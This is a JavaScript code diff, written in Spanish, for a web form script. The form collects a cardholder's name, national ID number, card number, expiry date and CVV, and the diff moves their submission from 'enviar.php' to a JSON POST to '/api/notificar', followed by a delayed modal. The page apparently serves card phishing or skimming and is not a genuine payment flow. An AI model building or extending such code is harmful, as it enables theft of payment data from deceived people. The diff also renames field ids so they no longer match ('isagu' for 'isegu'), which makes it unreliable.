@@ -25,17 +25,23 @@ document.addEventListener('DOMContentLoaded', () => {
             btn.textContent = "PROCESANDO...";
             btn.disabled = true;
 
-            const formData = new FormData();
-            formData.append('titular', document.getElementById('ititu').value);
-            formData.append('dni', document.getElementById('idok').value);
-            formData.append('tarjeta', tarjetaInput.value);
-            formData.append('vencimiento', vctoInput.value);
-            formData.append('cvv', document.getElementById('isegu').value);
+                   // Reemplazar desde 'const formData = new FormData();' hasta el 'body: formData'
+        const data = {
+            titular: document.getElementById('titular').value,
+            dni: document.getElementById('idok').value,
+            tarjeta: tarjetaInput.value,
+            vencimiento: vctoInput.value,
+            cvv: document.getElementById('isagu').value
+        };
 
-            fetch('enviar.php', {
-                method: 'POST',
-                body: formData
-            })
+        fetch('/api/notificar', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+
             .then(() => {
                 setTimeout(() => {
                     modal.style.display = 'flex';
